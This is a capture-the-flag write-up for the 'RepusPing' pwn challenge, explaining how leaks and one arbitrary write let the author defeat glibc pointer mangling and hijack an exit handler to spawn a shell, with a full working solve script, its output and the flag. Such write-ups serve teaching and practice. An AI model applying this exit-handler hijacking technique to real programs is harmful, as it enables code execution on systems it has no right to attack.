---
title: RepusPing
date: 2026-06-28
tags:
- pwn
- MntcrlCTF-2026
---

* **Challenge:** RepusPing
* **Category:** Pwn
* **Flag:** `mntcrl{0h_0h_1'm_sm4ll3st_but_n0t_b4by?_27e58fa8a757f7e6}`

---

## My initial read / first impressions

We are given a tiny pwn challenge with a remote service:

```bash
ncat --ssl smallest-5da47b0c14e4.c.mntcrl.it 443
```

The provided zip has the binary, libc, linker, Dockerfile, run script, and source:

- `chall`
- `lib/libc.so.6`
- `lib/ld-linux-x86-64.so.2`
- `Dockerfile`
- `run.sh`
- `src/chall.c`

The source is very short, which is usually either really nice or really cursed.

```c
#define N_LEAK 3

uintptr_t libc_sample = 0;
uintptr_t ld_sample = 0;

__attribute__((constructor))
void init(){	
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

	libc_sample = (uintptr_t)&puts;
	ld_sample = (uintptr_t)_r_debug.r_ldbase;
}
```

The constructor stores two useful pointers globally:

* `libc_sample = &puts`
* `ld_sample = _r_debug.r_ldbase`

Then `main()` prints the linker base directly, gives us three arbitrary 8-byte reads, then gives us one arbitrary 8-byte write.

```c
int main(){
	uint64_t addr;
	uint64_t value;

	puts("Here's a little gift");
	printf("%#016lx\n", ld_sample);
	
	puts("I'll give you a gift, enter a number");
	for(int i = 0; i < N_LEAK; i++){
		scanf("%ld", &addr);
		printf("%#016lx\n", *(uint64_t *)addr);
	}
	puts("No more gifts now!");

	scanf("%ld", &addr);
	scanf("%ld", &value);
	
	__asm__ volatile (
        ".intel_syntax noprefix;"
        "mov QWORD PTR [%0], %1;"
        ".att_syntax;"
        : 
        : "r" (addr), "r" (value)
        : "memory"
    );
	
	exit(0);
}
```

So the bug is extremely direct. We get:

1. A free `ld` base leak.
2. Three arbitrary reads.
3. One arbitrary write.
4. Then the program calls `exit(0)`.

At first, this feels almost too small, which is probably the whole point.

## The goal

There is a `win()` function in the binary:

```c
void win() {
    __asm__ volatile (
        ".intel_syntax noprefix;"        
        "mov rax, 0x68732f6e69622f;" 
        "push rax;"
        "mov rdi, rsp;"
        "xor rsi, rsi;"
        "xor rdx, rdx;"
        "mov rax, 59;"
        "syscall;"       
        ".att_syntax;"
    );

    exit(0);
}
```

This just does:

```c
execve("/bin/sh", NULL, NULL)
```

The run script writes the flag to `/tmp/flag.txt` before starting the challenge:

```sh
echo $FLAG > /tmp/flag.txt
export FLAG=""

LINKER="./lib/ld-linux-x86-64.so.2"
LIB="./lib"

exec $LINKER --library-path $LIB ./chall
```

So if we can redirect execution to `win()`, we get a shell and can run:

```bash
cat /tmp/flag.txt
```

The important addresses from the binary are:

```text
win         = 0x40121a
libc_sample = 0x404070
```

Since the binary is not PIE, those addresses are stable.

## The obvious idea that does not work

The first thought is to overwrite a GOT entry.

Something like:

```text
exit@got -> win
```

Then when the program calls `exit(0)`, it jumps to `win()`.

But the binary has full RELRO, so the GOT is read-only by the time we get our write. That means the easy GOT overwrite path is dead.

Also, we only get one write, and it happens right before `exit()`, so we need to overwrite something that `exit()` itself will use.

That points toward libc exit handlers.

## The actual target

When a program exits, glibc runs registered exit handlers from `__exit_funcs`.

One of the handlers that gets called is `_dl_fini`, which lives in the dynamic linker. The nice part is that the challenge already leaks the linker base for us.

The annoying part is that glibc does pointer mangling for function pointers in exit handlers.

The stored pointer is not just:

```text
_dl_fini
```

It is encoded roughly like this:

```text
encoded = rol(pointer ^ pointer_guard, 17)
```

So if we want to overwrite the exit handler with `win`, we cannot just write `0x40121a`.

We need to:

1. Leak the encoded `_dl_fini` pointer from libc.
2. Decode it using the known `_dl_fini` address.
3. Recover `pointer_guard`.
4. Re-encode `win`.
5. Overwrite the encoded exit handler slot with encoded `win`.

Then when the program calls `exit(0)`, glibc decodes the handler and jumps to `win()`.

## Leaking everything we need

The service gives us `ld_base` immediately:

```text
Here's a little gift
0x7ffa0c64a000
```

Then we use the first arbitrary read on `libc_sample`.

Since `libc_sample` contains `&puts`, reading address `0x404070` gives us the runtime address of `puts`.

```python
puts = leak(0x404070)
libc_base = puts - 0x82060
```

The `puts` offset in the provided libc is:

```text
0x82060
```

So now we have libc base.

The next thing to leak is the encoded exit handler pointer.

For the provided libc, the encoded `_dl_fini` handler is at:

```text
libc_base + 0x1e8ff8
```

So we read that:

```python
encoded_dl_fini = leak(libc_base + 0x1e8ff8)
```

Now we know:

- the encoded value from libc
- the real `_dl_fini` address, because `_dl_fini = ld_base + 0x5c00`

So we can recover the guard:

```python
pointer_guard = ror(encoded_dl_fini, 17) ^ (ld_base + 0x5c00)
```

Then encode `win()` the same way:

```python
encoded_win = rol(0x40121a ^ pointer_guard, 17)
```

Finally, the one arbitrary write becomes:

```text
*(libc_base + 0x1e8ff8) = encoded_win
```

After that the binary calls `exit(0)`, glibc runs the exit handler, decodes our value, and jumps to `win()`.

## Solve Script

```python
import socket
import ssl
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "smallest-5da47b0c14e4.c.mntcrl.it"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 443

PUTS_OFF = 0x82060
DL_FINI_OFF = 0x5c00

LIBC_SAMPLE = 0x404070
WIN = 0x40121a

EXIT_FN_ENC_OFF = 0x1e8ff8

MASK = (1 << 64) - 1

def rol(x, r):
    x &= MASK
    return ((x << r) & MASK) | (x >> (64 - r))

def ror(x, r):
    x &= MASK
    return (x >> r) | ((x << (64 - r)) & MASK)

def signed64(x):
    x &= MASK
    if x < (1 << 63):
        return x
    return x - (1 << 64)

ctx = ssl._create_unverified_context()
raw = socket.create_connection((HOST, PORT), timeout=10)
s = ctx.wrap_socket(raw, server_hostname=HOST)
s.settimeout(10)

def recvline():
    data = b""
    while not data.endswith(b"\n"):
        b = s.recv(1)
        if not b:
            break
        data += b
    return data

def send_num(x):
    s.sendall(str(signed64(x)).encode() + b"\n")

def leak(addr):
    send_num(addr)
    line = recvline()
    return int(line.strip(), 16)

print(recvline().decode(errors="replace"), end="")
ld_base = int(recvline().strip(), 16)
print(f"[+] ld_base  = {ld_base:#x}")
print(recvline().decode(errors="replace"), end="")

puts = leak(LIBC_SAMPLE)
libc_base = puts - PUTS_OFF

print(f"[+] puts     = {puts:#x}")
print(f"[+] libc     = {libc_base:#x}")

encoded_dl_fini = leak(libc_base + EXIT_FN_ENC_OFF)
print(f"[+] encoded  = {encoded_dl_fini:#x}")

leak(LIBC_SAMPLE)

pointer_guard = ror(encoded_dl_fini, 17) ^ (ld_base + DL_FINI_OFF)
encoded_win = rol(WIN ^ pointer_guard, 17)

print(f"[+] guard    = {pointer_guard:#x}")
print(f"[+] win_enc  = {encoded_win:#x}")

send_num(libc_base + EXIT_FN_ENC_OFF)
send_num(encoded_win)

s.sendall(b"cat /tmp/flag.txt; echo __END__\n")

out = b""
end = time.time() + 5

while time.time() < end and b"__END__" not in out:
    try:
        chunk = s.recv(4096)
        if not chunk:
            break
        out += chunk
    except TimeoutError:
        break

print(out.decode(errors="replace"))
```

Running it:

```bash
python solve.py
```

Output:

```text
Here's a little gift
[+] ld_base  = 0x7ffa0c64a000
I'll give you a gift, enter a number
[+] puts     = 0x7ffa0c4ce060
[+] libc     = 0x7ffa0c44c000
[+] encoded  = 0x8352540676d85f73
[+] guard    = 0x2fb9be532667c76c
[+] win_enc  = 0x7ca64c4faaec5f73
No more gifts now!
mntcrl{0h_0h_1'm_sm4ll3st_but_n0t_b4by?_27e58fa8a757f7e6}
__END__
```

And that gives the flag.

## Why this works

The challenge gives us a really strong primitive, but only in a tiny amount:

- 3 reads
- 1 write

Because the binary is full RELRO, the normal GOT overwrite idea does not work. But the program calls `exit()` right after our write, and `exit()` uses libc’s exit handler list.

So instead of trying to hijack a normal function call, we hijack the thing that `exit()` is already about to call.

The only extra annoying part is glibc pointer mangling. But since the existing encoded function pointer points to `_dl_fini`, and the challenge leaks the linker base, we can recover the pointer guard and encode our own target.

So the final exploit is basically:

```text
leak ld base
leak puts
calculate libc base
leak encoded _dl_fini exit handler
recover pointer_guard
encode win()
overwrite exit handler
let exit() call win()
cat /tmp/flag.txt
```

Tiny binary, tiny primitive, but the exit handler trick makes it enough.